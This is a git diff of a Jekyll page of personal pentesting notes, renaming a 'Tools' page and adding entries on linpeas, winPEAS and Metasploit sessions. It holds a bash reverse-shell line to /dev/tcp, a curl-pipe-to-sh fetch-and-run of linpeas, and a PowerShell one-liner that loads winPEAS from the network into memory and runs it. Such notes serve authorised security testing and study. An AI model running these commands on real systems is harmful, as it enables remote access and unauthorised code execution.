@@ -1,9 +1,12 @@
 ---
 layout: single
 classes: #wide
-title: "Tools"
+title: "General Info"
+sidebar:
+    title: "Pentest Info"
+    nav: infosec
 collection: infopages
-permalink: /tools/
+permalink: /infosec/general/
 toc: true
 toc_sticky: true
 author_profile: true
@@ -57,9 +60,21 @@ after get shell:
 
 bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1
 
+## Linpeas & Winpeas
+[Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):  
+`curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh `  
+`python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh', 'linpeas.sh')" `  
+
+[Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS):  
+url =   
+`$url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" `  
+One liner to download and execute winPEASany from memory in a PS shell  
+`$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") `
 
 ## Other
-Pspy - inspect application
+Pspy - inspect application  
+`powershell -c` - allows for powershell command  
+winpeas & linpeas
 
 
 ## Refrance links 
@@ -68,3 +83,10 @@ tbd
 ## Post exploitation
 look for weird configs  
 linpeas.sh big
+
+## Msfconsole
+`sessions -i <session num>` - attach session   
+`sessions -u <session num>` - upgrade to meterpreter
+
+### Meterpreter
+`channel -i <session>` - attaches
